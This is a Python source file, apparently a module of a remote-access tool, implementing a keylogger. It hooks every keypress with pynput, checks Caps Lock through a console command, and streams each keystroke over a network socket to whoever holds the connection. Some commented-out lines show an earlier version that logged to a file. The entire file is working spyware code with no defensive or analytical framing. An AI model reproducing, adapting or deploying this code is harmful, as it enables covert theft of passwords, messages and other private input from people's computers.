from pynput import keyboard
from windowscmdhandler import command_handler

def keylogger(sock):
    skipKeys = [keyboard.Key.ctrl,keyboard.Key.ctrl_l,keyboard.Key.ctrl_r,keyboard.Key.num_lock,keyboard.Key.alt,keyboard.Key.alt_l,keyboard.Key.alt_r,keyboard.Key.backspace,
                keyboard.Key.caps_lock]
    def logkeys(key):
        log = str(key).strip('\'').lower()
        cmd_handler = command_handler('[Console]::CapsLock')
        if cmd_handler == 'True':
            log = str(key).strip('\'').upper()
            # if key == keyboard.Key.caps_lock:
            #     log = str(key).strip('\'').lower()
        if cmd_handler == 'False':
            log = str(key).strip('\'').lower()
            # if key == keyboard.Key.caps_lock:
            #     log = str(key).strip('\'').upper()
        if key == keyboard.Key.enter:
            sock.send(b'\n')
        elif key == keyboard.Key.backspace:
            # f.seek(0)
            # content = f.read()

            # if content:
            #     content = content[:-1]

            # f.seek(0)
            # f.truncate()
            # f.write(content)
            sock.send(b'<backspace>')
        elif key == keyboard.Key.space:
            # f.write(" ")
            sock.send(b' ')
        elif key == keyboard.Key.tab:
            # f.write("\t")
            sock.send(b'\t')
        elif key == keyboard.Key.shift or key == keyboard.Key.shift_l or key == keyboard.Key.shift_r:
            pass
        elif key in skipKeys:
            pass
        else:
            sock.send(log.encode())
                
    with keyboard.Listener(on_press=logkeys) as kl:
        kl.join()
